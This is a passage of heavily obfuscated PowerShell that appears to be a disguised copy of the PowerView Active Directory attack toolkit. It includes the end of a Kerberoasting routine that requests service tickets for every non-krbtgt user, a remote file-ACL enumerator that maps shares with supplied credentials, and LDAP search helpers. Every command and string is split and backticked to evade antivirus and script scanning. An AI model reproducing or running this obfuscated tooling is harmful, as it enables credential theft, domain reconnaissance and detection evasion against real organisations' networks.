        if (${pS`BOUnDpa`RA`me`Ters}[("{1}{0}{2}"-f'omai','D','n')]) { ${us`E`RSE`AR`cHe`RaRGUMEnTs}[("{2}{0}{1}" -f'om','ain','D')] = ${Do`mAIN} }
        if (${PSb`OUn`d`pAraMET`erS}[("{2}{1}{0}" -f'er','DAPFilt','L')]) { ${UsErse`Ar`cHeRA`Rgumen`Ts}[("{2}{1}{0}"-f 'lter','PFi','LDA')] = ${lD`A`PFiLTeR} }
        if (${psb`oU`NDPaR`A`mEt`ErS}[("{2}{1}{3}{0}"-f'Base','ar','Se','ch')]) { ${uS`ErseAr`che`RArg`UMENts}[("{0}{2}{1}"-f 'Sear','hBase','c')] = ${sEa`RcHB`Ase} }
        if (${PsBo`UnD`pA`RA`MEtErs}[("{0}{1}"-f 'Se','rver')]) { ${U`sErS`E`ARcHEra`RgUMeNTS}[("{1}{0}" -f 'rver','Se')] = ${s`ErV`er} }
        if (${pS`BO`UnDpA`RAMEteRS}[("{2}{1}{0}"-f 'ope','chSc','Sear')]) { ${UsErseARChE`R`AR`g`UM`en`Ts}[("{1}{2}{3}{0}" -f'hScope','S','e','arc')] = ${S`e`ArChsCOPe} }
        if (${PSB`o`UnDPar`Am`Et`ERS}[("{0}{3}{2}{1}" -f 'Res','ize','PageS','ult')]) { ${us`ERSE`ARchERarGuM`enTS}[("{3}{0}{1}{2}" -f 'e','Siz','e','ResultPag')] = ${Resu`LtPag`e`siZe} }
        if (${P`SbO`UN`D`paRAMEtE`RS}[("{4}{2}{0}{3}{1}"-f 'Tim','mit','erver','eLi','S')]) { ${uS`eRS`EaRCh`E`R`ARgUM`eNTs}[("{0}{1}{4}{2}{3}"-f 'ServerTi','m','L','imit','e')] = ${S`erV`e`R`T`iMELIMIT} }
        if (${pS`Bo`UNdp`ArAm`Eters}[("{0}{2}{1}" -f 'Tombs','ne','to')]) { ${UseR`SE`ARCh`ERARG`U`M`Ents}[("{0}{2}{1}" -f 'Tomb','one','st')] = ${toM`BstO`NE} }
        if (${p`SBOu`NdpArAmEtE`RS}[("{2}{0}{1}" -f'dentia','l','Cre')]) { ${uSeR`S`EarC`HEraRG`UMEnTs}[("{2}{0}{1}" -f'tia','l','Creden')] = ${Cr`eDe`Nt`iaL} }

        if (${psBo`UN`dparAmEte`RS}[("{0}{2}{1}" -f 'Crede','l','ntia')]) {
            ${lO`Gon`TOk`eN} = &("{1}{2}{0}{4}{3}{5}"-f'-UserI','In','voke','ati','mperson','on') -Credential ${c`RED`eNTial}
        }
    }

    PROCESS {
        if (${PSBo`Un`d`pA`RamEte`RS}[("{0}{1}" -f'Ide','ntity')]) { ${usEr`SEArcHer`A`Rgu`MENtS}[("{1}{0}" -f 'ty','Identi')] = ${I`dE`NTITy} }
        &("{0}{1}{2}{3}"-f'Ge','t-Dom','ainUse','r') @UserSearcherArguments | &("{3}{0}{1}{2}" -f'he','re-Obje','ct','W') {${_}."saMAccoU`N`TNaME" -ne ("{0}{1}" -f 'krbtg','t')} | &("{2}{3}{1}{0}" -f 'NTicket','-DomainSP','G','et') -OutputFormat ${o`UtPUT`ForM`At}
    }

    END {
        if (${lo`GO`NtOkeN}) {
            &("{4}{2}{3}{0}{1}"-f 'vert','ToSelf','ke-','Re','Invo') -TokenHandle ${L`Og`O`NToKeN}
        }
    }
}


function GeT-P`A`THaCL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{1}{2}"-f'PS','h','ouldProcess','S'}, '')]
    [OutputType({"{3}{2}{1}{0}"-f 'FileACL','w.','werVie','Po'})]
    [CmdletBinding()]
    Param(
        [Parameter(MANDaTory = ${tR`Ue}, vAlUEFROmpipelInE = ${Tr`UE}, ValUeFrOMPiPElInEbYprOpeRtyNAmE = ${T`RuE})]
        [Alias({"{0}{1}"-f'Ful','lName'})]
        [String[]]
        ${P`AtH},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crE`den`TIAL} =   (&("{1}{2}{3}{0}" -f'Ble','gE','T-VaRi','A')  ('jh3x'+'o6') -VALueOn  )::"E`mpty"
    )

    BEGIN {

        function CO`NvErt`-FilER`i`GhT {
            
            [CmdletBinding()]
            Param(
                [Int]
                ${F`sR}
            )

            ${Ac`cE`SS`mask} = @{
                [uint32]("{0}{2}{1}" -f '0x80','00000','0') = ("{0}{2}{1}" -f 'Gener','cRead','i')
                [uint32]("{1}{0}{2}"-f '0','0x400000','0') = ("{3}{2}{1}{0}"-f 'rite','cW','ri','Gene')
                [uint32]("{1}{0}{2}"-f '000000','0x2','0') = ("{2}{3}{0}{1}"-f 'cu','te','G','enericExe')
                [uint32]("{0}{1}{2}{3}"-f'0','x','100000','00') = ("{1}{0}{2}" -f 'ne','Ge','ricAll')
                [uint32]("{3}{1}{0}{2}"-f '0000','x02','00','0') = ("{2}{1}{0}" -f 'imumAllowed','x','Ma')
                [uint32]("{2}{1}{0}"-f'0','00000','0x01') = ("{2}{3}{4}{0}{1}" -f 'rit','y','AccessSystemS','e','cu')
                [uint32]("{0}{1}{2}"-f '0x','001','00000') = ("{0}{2}{1}" -f'Synch','e','roniz')
                [uint32]("{0}{2}{1}" -f'0','0080000','x0') = ("{2}{0}{1}"-f'rite','Owner','W')
                [uint32]("{1}{0}{2}" -f '4000','0x000','0') = ("{0}{1}{2}"-f'Wr','iteD','AC')
                [uint32]("{0}{2}{1}"-f'0','00','x000200') = ("{3}{2}{0}{1}"-f'o','l','ntr','ReadCo')
                [uint32]("{1}{2}{0}"-f'010000','0','x00') = ("{2}{0}{1}" -f'l','ete','De')
                [uint32]("{0}{1}{2}" -f'0x0','00','00100') = ("{0}{3}{2}{4}{1}"-f 'Wri','s','tt','teA','ribute')
                [uint32]("{0}{2}{1}" -f'0x0','80','00000') = ("{2}{0}{1}{3}"-f 'Attr','ib','Read','utes')
                [uint32]("{0}{3}{2}{1}"-f'0','040','0','x0000') = ("{2}{0}{1}" -f 'C','hild','Delete')
                [uint32]("{1}{2}{0}" -f '20','0x0000','00') = ("{2}{3}{1}{4}{0}" -f'e','/Tr','Ex','ecute','avers')
                [uint32]("{0}{2}{1}"-f'0','0000010','x0') = ("{4}{1}{2}{0}{3}" -f't','eE','xtendedAt','ributes','Writ')
                [uint32]("{3}{0}{2}{1}" -f'000','8','0','0x000') = ("{3}{4}{0}{2}{1}{6}{5}"-f'nd','d','e','ReadE','xte','tributes','At')
                [uint32]("{2}{1}{3}{0}" -f '004','x0000','0','0') = ("{4}{2}{1}{5}{0}{3}"-f'ctor','ata/Ad','endD','y','App','dSubdire')
                [uint32]("{0}{1}{2}"-f'0x','0000000','2') = ("{1}{2}{3}{0}"-f'dFile','Write','Data/A','d')
                [uint32]("{1}{2}{0}" -f '001','0x0000','0') = ("{3}{4}{1}{2}{0}" -f'ry','ListD','irecto','R','eadData/')
            }

            ${SIMplEp`E`R`Mi`ssiOns} = @{
                [uint32]("{1}{0}" -f 'x1f01ff','0') = ("{1}{2}{0}" -f 'rol','FullCon','t')
                [uint32]("{0}{1}{2}"-f '0x03','01','bf') = ("{1}{0}"-f'y','Modif')
                [uint32]("{1}{0}" -f'a9','0x0200') = ("{2}{0}{1}" -f'c','ute','ReadAndExe')
                [uint32]("{2}{0}{1}"-f'x02019','f','0') = ("{0}{2}{1}"-f'ReadA','dWrite','n')
                [uint32]("{1}{2}{0}"-f '89','0x','0200') = ("{1}{0}" -f 'ad','Re')
                [uint32]("{1}{2}{0}"-f '00116','0','x0') = ("{1}{0}" -f 'e','Writ')
            }

            ${pe`RM`iS`SIoNs} = @()

            
            ${PE`RMIssIo`Ns} += ${SIm`Plep`eRmiSs`iONS}."K`EYs" | &("{2}{3}{4}{0}{1}" -f 'e','ct','ForEa','c','h-Obj') {
                              if ((${f`SR} -band ${_}) -eq ${_}) {
                                ${SIm`PlepERMIS`S`iONs}[${_}]
                                ${F`SR} = ${F`sR} -band (-not ${_})
                              }
                            }

            
            ${PEr`miS`sIONS} += ${ac`CeSSMa`sK}."KE`ys" | &("{2}{1}{0}{3}"-f'-Objec','here','W','t') { ${f`sR} -band ${_} } | &("{2}{1}{3}{0}"-f'-Object','c','ForEa','h') { ${ac`C`e`SSMASk}[${_}] }
            (${pe`RmiSS`ionS} | &("{1}{2}{0}"-f 're-Object','W','he') {${_}}) -join ','
        }

        ${conVeRT`ArG`UMEN`TS} = @{}
        if (${pSBOUN`DPA`Ra`MEtERS}[("{2}{0}{1}"-f'redenti','al','C')]) { ${COnVER`Ta`R`gu`M`eNTs}[("{1}{2}{0}" -f 'al','Creden','ti')] = ${cr`ED`En`TIaL} }

        ${M`Ap`pEDco`mp`UTers} = @{}
    }

    PROCESS {
        ForEach (${tARGe`TPA`Th} in ${p`ATh}) {
            try {
                if ((${TAr`G`ET`Path} -Match ((("{2}{4}{0}{3}{1}{5}" -f'.*aH','aHc','aH','c','caHcaHcaHc','.*')) -rePLaCe  'aHc',[chaR]92)) -and (${P`sbO`UnDPARA`MeT`eRs}[("{1}{0}{2}" -f 'entia','Cred','l')])) {
                    ${HOS`TcomPUT`ER} = (&("{1}{2}{0}"-f 'Object','N','ew-') ("{0}{3}{2}{1}" -f'S','i','m.Ur','yste')(${tAr`gE`T`pATh}))."ho`sT"
                    if (-not ${ma`P`pe`DCoM`PUtERs}[${hOSTC`O`mP`Uter}]) {
                        
                        &("{3}{4}{2}{1}{0}" -f'on','onnecti','RemoteC','A','dd-') -ComputerName ${HOS`TC`OMPuTEr} -Credential ${C`Re`deNtIAl}
                        ${MappE`dCoM`PutErs}[${HO`StCO`m`puTEr}] = ${tr`Ue}
                    }
                }

                ${A`cl} = &("{1}{0}" -f'-Acl','Get') -Path ${TArG`etPa`TH}

                ${A`Cl}."gE`TacC`essRU`Les"(${tR`UE}, ${T`RuE}, [System.Security.Principal.SecurityIdentifier]) | &("{0}{4}{1}{2}{3}"-f'F','ach-','Objec','t','orE') {
                    ${s`id} = ${_}."ideNTIty`R`eFeREn`Ce"."vaL`Ue"
                    ${n`AME} = &("{3}{1}{2}{0}{4}"-f'-','o','nvertFrom','C','SID') -ObjectSID ${S`iD} @ConvertArguments

                    ${O`Ut} = &("{1}{0}{2}"-f 'w-Obje','Ne','ct') ("{1}{2}{0}"-f 't','P','SObjec')
                    ${O`UT} | &("{0}{1}{2}"-f 'Add-','Me','mber') ("{1}{0}{2}{3}"-f'otepro','N','pe','rty') ("{0}{1}" -f 'Pa','th') ${t`Arg`eTPa`Th}
                    ${o`UT} | &("{0}{2}{1}" -f'A','mber','dd-Me') ("{1}{3}{0}{2}"-f 'per','Notepr','ty','o') ("{1}{3}{2}{0}" -f 'hts','F','g','ileSystemRi') (&("{3}{0}{4}{1}{5}{2}" -f'nv','rt-FileR','ght','Co','e','i') -FSR ${_}."FI`Le`SyStemR`IgHtS"."vaLU`E__")
                    ${o`UT} | &("{1}{0}{2}"-f 'em','Add-M','ber') ("{0}{3}{2}{1}"-f 'N','rty','rope','otep') ("{3}{2}{1}{0}"-f 'e','tyReferenc','enti','Id') ${nA`Me}
                    ${O`Ut} | &("{2}{0}{1}"-f'm','ber','Add-Me') ("{0}{1}{2}"-f'Notepro','p','erty') ("{2}{1}{3}{0}"-f 'D','entit','Id','ySI') ${s`iD}
                    ${o`UT} | &("{1}{0}{2}"-f 'm','Add-Me','ber') ("{1}{3}{2}{0}" -f'property','N','te','o') ("{3}{0}{2}{1}" -f 'ccessCont','pe','rolTy','A') ${_}."aCC`E`sSc`ONt`RO`LTYPE"
                    ${O`UT}."P`SOBJE`CT"."Type`NA`m`Es".("{1}{0}" -f'sert','In').Invoke(0, ("{3}{2}{0}{1}"-f'erView.FileA','CL','ow','P'))
                    ${O`Ut}
                }
            }
            catch {
                &("{1}{0}{2}{3}"-f 'te-V','Wri','er','bose') ('[Get-Pat'+'hAc'+'l] '+'err'+'or:'+' '+"$_")
            }
        }
    }

    END {
        
        ${MA`p`PedCo`mP`UTers}."KE`YS" | &("{3}{0}{4}{5}{2}{1}" -f 'moteCo','n','tio','Remove-Re','n','nec')
    }
}


function CONv`e`Rt-`lDApPr`oPe`RTy {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{4}{2}{1}{3}" -f'PSShoul','roc','P','ess','d'}, '')]
    [OutputType({"{1}{3}{4}{8}{2}{6}{5}{10}{12}{11}{0}{9}{7}" -f'om','S','ge','ystem.Ma','n','o','ment.Aut','ect','a','Obj','m','ust','ation.PSC'})]
    [CmdletBinding()]
    Param(
        [Parameter(MandAtOrY = ${Tr`UE}, vAluEfrompipeLINE = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        ${PRo`p`ERtiEs}
    )

    ${objeC`Tp`RO`PeRTiEs} = @{}

    ${PrO`PE`RTies}."Pr`OPE`RTYNames" | &("{2}{0}{3}{1}" -f'h-Ob','ect','ForEac','j') {
        if (${_} -ne ("{0}{1}{2}" -f'adsp','a','th')) {
            if ((${_} -eq ("{0}{1}{2}" -f'ob','je','ctsid')) -or (${_} -eq ("{3}{0}{1}{2}" -f 'i','dhisto','ry','s'))) {
                
                ${ObjEc`TPRopE`R`Ti`ES}[${_}] = ${PR`o`pERti`Es}[${_}] | &("{3}{2}{0}{1}"-f 'bjec','t','rEach-O','Fo') { (&("{0}{2}{1}{3}"-f'New','je','-Ob','ct') ("{2}{1}{0}{6}{4}{5}{7}{3}"-f'inc','rity.Pr','System.Secu','ier','al.Securi','tyIdent','ip','if')(${_}, 0))."V`AlUE" }
            }
            elseif (${_} -eq ("{1}{3}{0}{2}"-f'uptyp','g','e','ro')) {
                ${obJE`cTpRO`p`eRTiES}[${_}] = ${PRoPe`R`Ti`es}[${_}][0] -as ${g`R`o`UPtYpeENum}
            }
            elseif (${_} -eq ("{2}{1}{3}{0}"-f'ttype','amacco','s','un')) {
                ${oBj`Ec`T`PRopERtI`es}[${_}] = ${P`Ro`pERTIeS}[${_}][0] -as ${S`A`macco`U`NtTyp`EeNum}
            }
            elseif (${_} -eq ("{0}{2}{1}"-f'obj','ctguid','e')) {
                
                ${O`BjeCt`ProP`E`RTiEs}[${_}] = (&("{3}{0}{1}{2}"-f '-Obj','e','ct','New') ("{0}{1}"-f'Gu','id') (,${p`R`OpErtIES}[${_}][0]))."gu`Id"
            }
            elseif (${_} -eq ("{3}{1}{2}{0}{5}{4}"-f'tr','untco','n','useracco','l','o')) {
                ${O`BJ`e`C`TPr`OpErtIEs}[${_}] = ${pr`Op`eRt`iES}[${_}][0] -as ${U`AC`enUm}
            }
            elseif (${_} -eq ("{1}{0}{2}{3}{4}" -f'ecuri','nts','tydesc','rip','tor')) {
                
                ${DE`S`CRiptoR} = &("{1}{2}{0}" -f 'ect','Ne','w-Obj') ("{8}{2}{10}{4}{6}{7}{9}{1}{5}{0}{3}"-f'escri','rit','ecurity.AccessCo','ptor','r','yD','ol.Ra','w','S','Secu','nt') -ArgumentList ${p`ROPe`Rties}[${_}][0], 0
                if (${DeS`CRi`ptor}."OWn`ER") {
                    ${ObJ`ectPR`oPe`Rt`IES}[("{1}{0}"-f'r','Owne')] = ${deSCri`Pt`Or}."Ow`NEr"
                }
                if (${dE`sCRip`Tor}."g`ROuP") {
                    ${o`BJ`EctpR`OpEr`TI`ES}[("{0}{1}"-f'Grou','p')] = ${D`EScR`ipt`OR}."grO`UP"
                }
                if (${De`Sc`RiP`TOR}."DiScre`TI`onaRyA`cl") {
                    ${o`Bj`E`c`TProp`eRTIeS}[("{0}{1}{2}{3}"-f'Dis','cr','etionary','Acl')] = ${deS`Cri`PTor}."DIsCrETIoN`A`R`Y`Acl"
                }
                if (${DeSC`R`ipT`or}."sy`ST`EMAcl") {
                    ${oBJe`CtprOPER`T`IeS}[("{0}{3}{1}{2}" -f'S','A','cl','ystem')] = ${De`SCrI`Ptor}."SY`ST`eMaCL"
                }
            }
            elseif (${_} -eq ("{0}{1}{3}{2}" -f 'acco','unt','s','expire')) {
                if (${PRoPe`RtI`Es}[${_}][0] -gt  (&("{0}{1}" -f 'G','ci')  ("{0}{3}{1}{2}" -f'Va','bL','E:y0Q','Ria')  )."VAl`Ue"::"m`AXVa`lUe"."ti`Cks") {
                    ${o`B`JE`CTpROPE`R`TIES}[${_}] = ("{1}{0}" -f 'EVER','N')
                }
                else {
                    ${Ob`j`E`ct`proPERt`ieS}[${_}] =  ${y0Q}::"f`ROMFi`LetiME"(${prO`pE`RT`Ies}[${_}][0])
                }
            }
            elseif ( (${_} -eq ("{2}{0}{1}" -f'stlo','gon','la')) -or (${_} -eq ("{5}{4}{2}{0}{3}{1}"-f 'tlo','tamp','s','gontimes','a','l')) -or (${_} -eq ("{1}{2}{0}"-f 'et','pwdlas','ts')) -or (${_} -eq ("{0}{2}{1}"-f'lastlo','off','g')) -or (${_} -eq ("{3}{1}{2}{0}" -f'ime','swor','dT','badPas')) ) {
                
                if (${Pro`pERT`IEs}[${_}][0] -is [System.MarshalByRefObject]) {
                    
                    ${TE`mp} = ${prOp`eRti`Es}[${_}][0]
                    [Int32]${h`IGh} = ${T`emP}.("{0}{2}{1}"-f 'G','pe','etTy').Invoke().("{1}{0}{2}" -f 'Memb','Invoke','er').Invoke(("{1}{0}" -f 'ighPart','H'),   (  &('Ls')  ("va"+"RiaBlE:"+"Va"+"J"))."VaL`UE"::"GETpR`o`PErTy", ${N`UlL}, ${T`EmP}, ${n`ULl})
                    [Int32]${l`OW}  = ${T`eMp}.("{2}{0}{1}" -f't','Type','Ge').Invoke().("{3}{2}{0}{1}" -f 'e','r','emb','InvokeM').Invoke(("{1}{0}{2}"-f 'owP','L','art'),    ( &("{1}{3}{0}{2}"-f 'Iabl','get','E','-VaR')  ("{0}{1}" -f 'v','aJ') )."VaL`UE"::"gE`TpRoP`er`Ty", ${N`Ull}, ${tE`MP}, ${n`Ull})
                    ${ob`J`ect`PropER`T`iEs}[${_}] = ( ( &("{3}{2}{0}{1}" -f'I','LDitEm','Et-ch','G') ('Va'+'RiAbl'+'e'+':Y0q'))."VA`LUE"::"FR`o`Mf`iLEtiME"([Int64]("0x{0:x8}{1:x8}" -f ${hI`gh}, ${L`oW})))
                }
                else {
                    
                    ${o`B`jeCt`pRop`e`RTIes}[${_}] = (  (  &("{0}{1}"-f 'G','ci') ("Va"+"riA"+"blE:Y0Q"))."vAl`UE"::"F`RoMFi`lEtiME"((${pR`oP`Er`TIeS}[${_}][0])))
                }
            }
            elseif (${P`RoPe`RtIeS}[${_}][0] -is [System.MarshalByRefObject]) {
                
                ${p`Rop} = ${PrO`PeR`TIEs}[${_}]
                try {
                    ${T`emp} = ${Pr`Op}[${_}][0]
                    [Int32]${HI`gh} = ${T`emP}.("{0}{1}" -f'G','etType').Invoke().("{2}{1}{0}"-f'ber','keMem','Invo').Invoke(("{0}{1}{2}"-f 'Hig','hP','art'),   ( &("{1}{0}"-f'Ir','D') ("VaRi"+"abL"+"e:"+"VAJ"))."Va`lue"::"GeTpr`O`PeRtY", ${nu`lL}, ${T`eMP}, ${N`UlL})
                    [Int32]${l`oW}  = ${tE`mP}.("{0}{1}"-f'Ge','tType').Invoke().("{2}{0}{1}" -f 'e','Member','Invok').Invoke(("{1}{0}" -f 'rt','LowPa'),    ${V`Aj}::"gEtprOPe`R`TY", ${n`UlL}, ${T`EmP}, ${N`UlL})
                    ${OB`JeCT`p`Ro`peRti`es}[${_}] = [Int64]("0x{0:x8}{1:x8}" -f ${H`igh}, ${l`Ow})
                }
                catch {
                    &("{0}{1}{2}{3}"-f'Write-','Ver','bo','se') ('['+'Co'+'nv'+'ert'+'-LDAPProperty] '+'err'+'or:'+' '+"$_")
                    ${O`BJEcT`P`ROperT`ies}[${_}] = ${p`Rop}[${_}]
                }
            }
            elseif (${ProP`er`TieS}[${_}]."c`OUNT" -eq 1) {
                ${O`BjecTpRoP`eRT`ies}[${_}] = ${proP`erT`i`Es}[${_}][0]
            }
            else {
                ${Ob`J`ECTprOpe`RtI`es}[${_}] = ${pr`op`Er`Ties}[${_}]
            }
        }
    }
    try {
        &("{0}{2}{1}"-f'Ne','ect','w-Obj') -TypeName ("{2}{1}{0}" -f 'bject','O','PS') -Property ${obJE`CtpROP`e`RT`IES}
    }
    catch {
        &("{1}{2}{3}{0}{4}"-f 'e','W','r','it','-Warning') ('[C'+'on'+'ver'+'t-LDAPProperty]'+' '+'Err'+'o'+'r '+'parsin'+'g'+' '+'LDAP'+' '+'pr'+'op'+'erties '+': '+"$_")
    }
}








function Get-D`omaIN`Se`Ar`cHeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{2}{4}{0}" -f'rocess','S','Shoul','P','dP'}, '')]
    [OutputType({"{7}{2}{4}{3}{5}{6}{0}{8}{1}" -f'ctorySea','er','em.D','Ser','irectory','vices.Dir','e','Syst','rch'})]
    [CmdletBinding()]
    Param(
        [Parameter(ValUeFROmpIpELINe = ${T`RUe})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${D`o`main},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Fi','lter'})]
        [String]
        ${l`dapF`il`TeR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pro`PErT`IES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'h','Pat','ADS'})]
        [String]
        ${sE`ARC`HbAse},

        [ValidateNotNullOrEmpty()]
        [String]
        ${SE`ARc`Hba`se`prEFix},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{3}{0}{4}"-f'e','o','DomainContr','ll','r'})]
        [String]
        ${S`ErVer},

        [ValidateSet({"{1}{0}" -f 'e','Bas'}, {"{2}{0}{1}"-f'ne','Level','O'}, {"{2}{1}{0}" -f'ee','tr','Sub'})]
        [String]
        ${s`EAR`CHS`coPE} = ("{1}{2}{0}" -f 'ee','Subt','r'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`es`UlT`pA`gESiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SER`Ve`RTi`mE`lImiT} = 120,

        [ValidateSet({"{0}{1}"-f 'Dac','l'}, {"{0}{1}"-f'Grou','p'}, {"{0}{1}" -f'N','one'}, {"{0}{1}"-f 'Ow','ner'}, {"{0}{1}" -f'Sa','cl'})]
        [String]
        ${SEcurI`T`YMasKs},

        [Switch]
        ${t`OM`BSTonE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`RedENt`i`AL} =  ( &("{1}{0}{2}"-f'A','v','RIaBle') ('Jh'+'3'+'xo6'))."V`ALue"::"emP`Ty"
    )

    PROCESS {
        if (${P`SBO`UN`dParAMETErS}[("{1}{0}{2}" -f 'omai','D','n')]) {
            ${t`ARGETdO`MAIn} = ${doM`A`in}

            if (${E`NV:us`E`RDNsDoMaIN} -and (${e`Nv:UsER`DN`Sdo`maIn}.("{1}{0}"-f'rim','T').Invoke() -ne '')) {
                
                ${useR`do`MA`iN} = ${En`V:`User`d`NS`domaIN}
                if (${eNv:`l`og`oNSeR`Ver} -and (${eNv`:loG`OnsERv`eR}.("{1}{0}"-f 'm','Tri').Invoke() -ne '') -and ${USErDo`m`A`in}) {
                    ${BINdSe`R`VER} = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif (${pSbOU`N`D`pa`RaMeterS}[("{1}{2}{0}" -f 'l','Credenti','a')]) {
            
            ${D`O`MAINOB`je`ct} = &("{3}{1}{2}{0}" -f 'main','et-D','o','G') -Credential ${C`RedEn`T`IAL}
            ${BinDS`e`RV`eR} = (${d`omaiN`OBJECT}."pD`CrO`lEOWner")."N`Ame"
            ${tAR`get`DOMaIN} = ${DOM`A`INOBjECT}."n`AmE"
        }
        elseif (${En`V:`Use`R`DnS`DoMaIN} -and (${eN`V:UsER`D`NSdoMaIN}.("{1}{0}"-f'm','Tri').Invoke() -ne '')) {
            
            ${taRGEt`dO`ma`IN} = ${E`Nv`:us`e`RdNSDoMaiN}
            if (${EnV:`Lo`GOn`SERv`er} -and (${eNv`:l`oG`onse`RvER}.("{0}{1}"-f 'T','rim').Invoke() -ne '') -and ${tAr`g`eT`D`omAIN}) {
                ${BIN`D`SErvEr} = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            
            &("{3}{2}{1}{0}" -f'-verbose','te','i','wr') ("{1}{2}{0}" -f 'in','get-d','oma')
            ${DOm`A`Ino`BJecT} = &("{3}{0}{2}{1}" -f 'et-D','ain','om','G')
            ${bi`NDsE`RvEr} = (${domaIN`o`B`jEcT}."P`Dcr`OLEown`eR")."n`AmE"
            ${t`A`Rge`TDoMaiN} = ${D`oMaiNobJ`Ect}."N`AME"
        }

        if (${pS`B`Ou`NDpAr`AmeTE`RS}[("{0}{1}" -f 'Serve','r')]) {
            
            ${B`IN`dS`eRVEr} = ${S`eRvER}
        }

        ${SeaR`cHSTR`Ing} = ("{0}{1}"-f 'LDAP:','//')

        if (${BI`N`DSer`VER} -and (${Bi`N`Dserv`Er}.("{1}{0}"-f'rim','T').Invoke() -ne '')) {
            ${SeAr`C`HsT`Ri`Ng} += ${b`i`NdServEr}
            if (${ta`RG`ETdoM`AIn}) {
                ${s`eArchST`RI`NG} += '/'
            }
        }

        if (${PSBoU`NdPa`RA`mete`RS}[("{0}{4}{3}{1}{2}" -f'Searc','re','fix','aseP','hB')]) {
            ${sEArCHsT`RI`NG} += ${se`A`R`cHBas`eP`RefiX} + ','
        }

        if (${PsBo`Un`d`parAM`eTers}[("{1}{2}{0}"-f'e','SearchBa','s')]) {
            if (${sE`ArC`Hb`ASe} -Match ("{0}{1}" -f '^GC:','//')) {
                
                ${d`N} = ${s`EaRc`h`BASe}.("{2}{1}{0}" -f 'r','oUppe','T').Invoke().("{1}{0}"-f 'm','Tri').Invoke('/')
                ${s`eaRchS`T`Ri`NG} = ''
            }
            else {
                if (${s`E`Ar`CHbaSe} -match ("{0}{2}{1}" -f'^L','://','DAP')) {
                    if (${s`EArcHB`A`Se} -match ("{1}{0}{2}{3}" -f'DAP:','L','/','/.+/.+')) {
                        ${SE`ARchS`TRInG} = ''
                        ${dn} = ${se`ArcHbA`SE}
                    }
                    else {
                        ${DN} = ${sE`ArCHb`A`se}.("{1}{0}" -f'ring','SubSt').Invoke(7)
                    }
                }
                else {
                    ${d`N} = ${SeARCh`B`Ase}
                }
            }
        }
        else {
            
            if (${T`ARGE`TDOMAIN} -and (${TA`RGe`Td`OmaiN}.("{0}{1}"-f'Tr','im').Invoke() -ne '')) {
                ${Dn} = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        ${SEARc`H`StRI`Ng} += ${DN}
        &("{0}{2}{1}" -f 'Write-Ve','se','rbo') ('[G'+'et-Dom'+'ai'+'nSe'+'ar'+'ch'+'er] '+'se'+'ar'+'ch '+'b'+'ase'+': '+"$SearchString")

        if (${C`REdENt`iAl} -ne  (&("{0}{3}{1}{2}" -f'GE','A','Ble','T-VARI')  ("{1}{0}"-f'3xo6','jH') -ValUEon )::"EM`PTY") {
            &("{1}{3}{0}{2}" -f '-V','Writ','erbose','e') ("{7}{8}{18}{17}{15}{16}{6}{13}{5}{14}{1}{9}{4}{10}{3}{12}{11}{2}{0}"-f 'n','ng ','tio','r L','rnate','r] Us','ar','[Ge','t','alte',' credentials fo',' connec','DAP','che','i','ai','nSe','Dom','-')
            
            ${Do`Ma`iNoBjE`ct} = &("{2}{0}{1}" -f'e','ct','New-Obj') ("{0}{5}{3}{4}{8}{7}{1}{6}{2}"-f'D','ector','ntry','ec','torySe','ir','yE','s.Dir','rvice')(${S`earC`HsT`RInG}, ${cre`DeNT`i`Al}."U`sern`AME", ${creDe`N`TiaL}.("{0}{4}{3}{2}{1}"-f'G','l','workCredentia','Net','et').Invoke()."PA`ss`woRD")
            ${SE`ARc`her} = &("{2}{1}{0}" -f 'bject','-O','New') ("{2}{10}{4}{6}{1}{9}{0}{5}{8}{3}{7}" -f 'ory','r','System.Direc','e','erv','Searc','ices.Di','r','h','ect','toryS')(${Do`mAIn`O`BJECT})
        }
        else {
            
            ${S`eARc`Her} = &("{2}{1}{0}"-f'ct','je','New-Ob') ("{3}{2}{5}{1}{4}{8}{7}{9}{11}{10}{0}{6}" -f'r','Direc','s','Sy','toryServ','tem.','cher','es.Dir','ic','ectory','a','Se')([ADSI]${Sea`RCH`STr`Ing})
        }

        ${S`eArCH`ER}."Pa`GE`size" = ${Res`U`LtPa`Ge`SIzE}
        ${SEar`ch`Er}."SeArCh`SCO`pE" = ${SEaRChsc`O`PE}
        ${sE`ArCHer}."caChEr`eS`Ults" = ${f`AL`Se}
        ${SEar`C`HER}."r`eFERRAlchA`Si`Ng" =   ${Me`Rg`p6}::"a`LL"

        if (${P`sbOunDp`ARa`ME`TeRS}[("{0}{1}{3}{4}{2}"-f 'Ser','ve','mit','rTimeL','i')]) {
            ${Se`Ar`ChEr}."S`eRVerTiMEl`iMIt" = ${sErvER`TI`MeLIm`iT}
        }

        if (${psBoUND`pAr`AME`T`eRs}[("{2}{1}{0}" -f'bstone','om','T')]) {
            ${SEARC`h`Er}."TOmBsTo`Ne" = ${tr`Ue}
        }

        if (${PSbo`UndpARaM`e`T`ers}[("{1}{2}{3}{0}" -f 'ilter','LD','A','PF')]) {
            ${seAR`ChER}."fI`LTer" = ${LDaP`FIl`TER}
        }

        if (${pSbo`UNDPAramET`E`RS}[("{1}{0}{3}{2}"-f'curity','Se','ks','Mas')]) {
            ${seA`Rc`HEr}."S`EcU`R`ITYmasKS" = Switch (${Sec`Ur`I`TYM`ASKs}) {
                ("{1}{0}"-f 'l','Dac') {   ${ZN`FE}::"d`ACL" }
